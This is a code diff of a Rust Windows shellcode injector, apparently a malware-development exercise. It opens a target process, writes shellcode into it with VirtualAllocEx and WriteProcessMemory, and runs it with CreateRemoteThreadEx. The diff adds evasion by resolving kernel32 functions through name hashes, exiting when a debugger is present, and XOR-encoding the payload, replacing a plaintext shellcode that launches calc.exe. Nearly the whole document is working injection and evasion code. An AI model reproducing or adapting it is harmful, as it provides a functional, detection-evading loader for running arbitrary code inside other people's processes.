@@ -84,7 +84,6 @@ type TVirtualFree = unsafe extern "system" fn(
 ) -> ();
    
 fn getHashFromFunc(funcName: &str) -> u32 {
-    // let stringLength: usize = funcName.len();
     let mut hash: u32 = 0x35;
 
     for c in funcName.chars() {
@@ -94,13 +93,15 @@ fn getHashFromFunc(funcName: &str) -> u32 {
     hash
 }
 
-fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32 {
+fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
     unsafe {
 
         let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
 
         let libBase: Result<HMODULE> = LoadLibraryA(lib_ptr);
-        
+
+        let mut funcAddresses: Vec<Option<*const u32>> = vec![None; hash.len()];
+         
         match libBase {
             Ok(h) => {
                 println!("\n");
@@ -153,42 +154,55 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32 {
 
                     let func_name_hash: u32 = getHashFromFunc(func_name_str) as u32;
                     
-                    if func_name_hash == hash {
+                    if let Some(pos) = hash.iter().position(|&h| h == func_name_hash) {
                         //println!("{:?} {:#x} {:#x} {:#x}", addr_names_ordinals_RVA.offset(i as isize), *addr_names_ordinals_RVA.offset(i as isize), addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32, *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32);
                         let func_addr_RVA: u32 = *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32;
                         let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
                         println!("[i] address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);
 
-                        return func_addr;
+                        funcAddresses[pos] = Some(func_addr);
                     }
                     
                 }
 
-                ptr::null() as *const u32
+                funcAddresses
 
             },
 
             Err(e) => process::exit(-1),
         }
     }
-} 
+}
 
 fn main() {
 
-    let shellcode: &[u8] = &[
-        0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x42, 0x60, 0x48, 0x8b, 0x70, 0x18, 0x48, 0x8b, 0x76, 0x20,
-        0x4c, 0x8b, 0x0e, 0x4d, 0x8b, 0x09, 0x4d, 0x8b, 0x49, 0x20, 0xeb, 0x63, 0x41, 0x8b, 0x49, 0x3c,
-        0x4d, 0x31, 0xff, 0x41, 0xb7, 0x88, 0x4d, 0x01, 0xcf, 0x49, 0x01, 0xcf, 0x45, 0x8b, 0x3f, 0x4d,
-        0x01, 0xcf, 0x41, 0x8b, 0x4f, 0x18, 0x45, 0x8b, 0x77, 0x20, 0x4d, 0x01, 0xce, 0xe3, 0x3f, 0xff,
-        0xc9, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x34, 0x8e, 0x4c, 0x01, 0xce, 0x48, 0x31, 0xc0, 0x48, 0x31,
-        0xd2, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xca, 0x0d, 0x01, 0xc2, 0xeb, 0xf4, 0x44, 0x39,
-        0xc2, 0x75, 0xda, 0x45, 0x8b, 0x57, 0x24, 0x4d, 0x01, 0xca, 0x41, 0x0f, 0xb7, 0x0c, 0x4a, 0x45,
-        0x8b, 0x5f, 0x1c, 0x4d, 0x01, 0xcb, 0x41, 0x8b, 0x04, 0x8b, 0x4c, 0x01, 0xc8, 0xc3, 0xc3, 0x41,
-        0xb8, 0x98, 0xfe, 0x8a, 0x0e, 0xe8, 0x92, 0xff, 0xff, 0xff, 0x48, 0x31, 0xc9, 0x51, 0x48, 0xb9,
-        0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x51, 0x48, 0x8d, 0x0c, 0x24, 0x48, 0x31, 0xd2,
-        0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd0,
-    ];
+    let raw_shellcode: &[u8] = &[0x52, 0x2b, 0xc8, 0x7f, 0x52, 0x91, 0x58,
+                             0x7a, 0x52, 0x91, 0x6a, 0x02, 0x52, 0x91, 
+                             0x6c, 0x3a, 0x56, 0x91, 0x14, 0x57, 0x91, 
+                             0x13, 0x57, 0x91, 0x53, 0x3a, 0xf1, 0x79, 
+                             0x5b, 0x91, 0x53, 0x26, 0x57, 0x2b, 0xe5, 
+                             0x5b, 0xad, 0x92, 0x57, 0x1b, 0xd5, 0x53, 
+                             0x1b, 0xd5, 0x5f, 0x91, 0x25, 0x57, 0x1b, 
+                             0xd5, 0x5b, 0x91, 0x55, 0x02, 0x5f, 0x91, 
+                             0x6d, 0x3a, 0x57, 0x1b, 0xd4, 0xf9, 0x25, 
+                             0xe5, 0xd3, 0x52, 0x2b, 0xec, 0x5b, 0x91, 
+                             0x2e, 0x94, 0x56, 0x1b, 0xd4, 0x52, 0x2b, 
+                             0xda, 0x52, 0x2b, 0xc8, 0xe6, 0xb6, 0x9e, 
+                             0xda, 0x6e, 0x1d, 0xdb, 0xd0, 0x17, 0x1b, 
+                             0xd8, 0xf1, 0xee, 0x5e, 0x23, 0xd8, 0x6f, 
+                             0xc0, 0x5f, 0x91, 0x4d, 0x3e, 0x57, 0x1b, 
+                             0xd0, 0x5b, 0x15, 0xad, 0x16, 0x50, 0x5f, 
+                             0x91, 0x45, 0x06, 0x57, 0x1b, 0xd1, 0x5b, 
+                             0x91, 0x1e, 0x91, 0x56, 0x1b, 0xd2, 0xd9, 
+                             0xd9, 0x5b, 0xa2, 0x82, 0xe4, 0x90, 0x14, 
+                             0xf2, 0x88, 0xe5, 0xe5, 0xe5, 0x52, 0x2b, 
+                             0xd3, 0x4b, 0x52, 0xa3, 0x79, 0x7b, 0x76, 
+                             0x79, 0x34, 0x7f, 0x62, 0x7f, 0x4b, 0x52, 
+                             0x97, 0x16, 0x3e, 0x52, 0x2b, 0xc8, 0x52, 
+                             0xe5, 0xd8, 0x52, 0x99, 0xf6, 0x32, 0xe5, 0xca];
 
+    let shellcode: Vec<u8> = raw_shellcode.iter().map(|&byte| byte ^ 0x1a).collect();
+    
     //getFuncAddressByHash("kernel32", 0xf92f7b);
 
     //println!("{:#x}", getHashFromFunc("CreateRemoteThreadEx"));
@@ -199,25 +213,40 @@ fn main() {
     unsafe {        
         println!("[i] Trying to open a Handle for the Process {pid}");
 
-        assert_eq!(getHashFromFunc("CreateRemoteThreadEx"), 0x857934);
+        //assert_eq!(getHashFromFunc("CreateRemoteThreadEx"), 0x857934);
+        let hash: Vec<u32> = vec![0x9e08d0, 0x8dd921, 0xf4ed1b, 0x4fd152, 0xa48f46, 0xc4edec, 0x857934, 0x397566, 0xbdd9cb, 0x675a2];
+
+        let adresses: Vec<Option<*const u32>> = getFuncAddressByHash("kernel32.dll", hash);
+
+        if adresses.contains(&None) {
+            process::exit(-1);
+        }
         
-        let XOpenProcess: TOpenProcess = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x9e08d0) as *const u32);
+        let XOpenProcess: TOpenProcess = mem::transmute(adresses[0].unwrap() as *const u32);
+        let XCheckRemoteDebuggerPresent: TCheckRemoteDebuggerPresent = mem::transmute(adresses[1].unwrap() as *const u32);
+        let XIsDebuggerPresent: TIsDebuggerPresent = mem::transmute(adresses[2].unwrap() as *const u32);
+        let XVirtualAllocEx: TVirtualAllocEx = mem::transmute(adresses[3].unwrap() as *const u32);
+        let XWriteProcessMemory: TWriteProcessMemory = mem::transmute(adresses[4].unwrap() as *const u32);
+        let XVirtualProtectEx: TVirtualProtectEx = mem::transmute(adresses[5].unwrap() as *const u32);
+        let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(adresses[6].unwrap() as *const u32);
+        let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(adresses[7].unwrap() as *const u32);
+        let XCloseHandle: TCloseHandle = mem::transmute(adresses[8].unwrap() as *const u32);
+        let XVirtualFree: TVirtualFree = mem::transmute(adresses[9].unwrap() as *const u32);
+
+        
         let hprocess = XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid);
 
         let mut debugger_present: BOOL = BOOL(0);
 
-        let XCheckRemoteDebuggerPresent: TCheckRemoteDebuggerPresent = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x8dd921) as *const u32);
         let _ = XCheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL);
         if debugger_present.as_bool() {
             process::exit(-1);
         }
 
-        let XIsDebuggerPresent: TIsDebuggerPresent = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xf4ed1b) as *const u32);
         if XIsDebuggerPresent().as_bool(){
             process::exit(-1);
         }
 
-        let XVirtualAllocEx: TVirtualAllocEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x4fd152) as *const u32);
         let haddr = XVirtualAllocEx(
             hprocess,
             null_mut(),
@@ -234,7 +263,6 @@ fn main() {
 
         println!("[i] Writing to memory at address {:p}", haddr);
 
-        let XWriteProcessMemory: TWriteProcessMemory = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xa48f46) as *const u32);
         XWriteProcessMemory(
             hprocess,
             haddr, 
@@ -244,7 +272,7 @@ fn main() {
         );
 
         let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
-        let XVirtualProtectEx: TVirtualProtectEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xc4edec) as *const u32);
+    
         XVirtualProtectEx(
             hprocess,
             haddr,
@@ -254,7 +282,7 @@ fn main() {
         );
         
         println!("\n[+] Creating a Remote Thread");
-        let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x857934) as *const u32);
+        
         
         //println!("Last Error : {:?}", GetLastError());
 
@@ -268,7 +296,7 @@ fn main() {
             null_mut(),
             null_mut(),
         ); */
-        
+
         let hthread = CreateRemoteThreadEx(
             hprocess,
             Some(null()),
@@ -284,10 +312,10 @@ fn main() {
             }
         );
 
-        let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x397566) as *const u32);
+        
         XWaitForSingleObject(hthread, INFINITE);
 
-        let XCloseHandle: TCloseHandle = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xbdd9cb) as *const u32);
+        
 
         let _ = XCloseHandle(hthread);
         println!("[i] Closed thread handle");
@@ -295,7 +323,6 @@ fn main() {
         let _ = XCloseHandle(hprocess);
         println!("[i] Closed process handle");
 
-        let XVirtualFree: TVirtualFree = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x675a2) as *const u32);
         let _ = XVirtualFree(haddr, 0, MEM_RELEASE);
         println!("[i] Memory released");
 
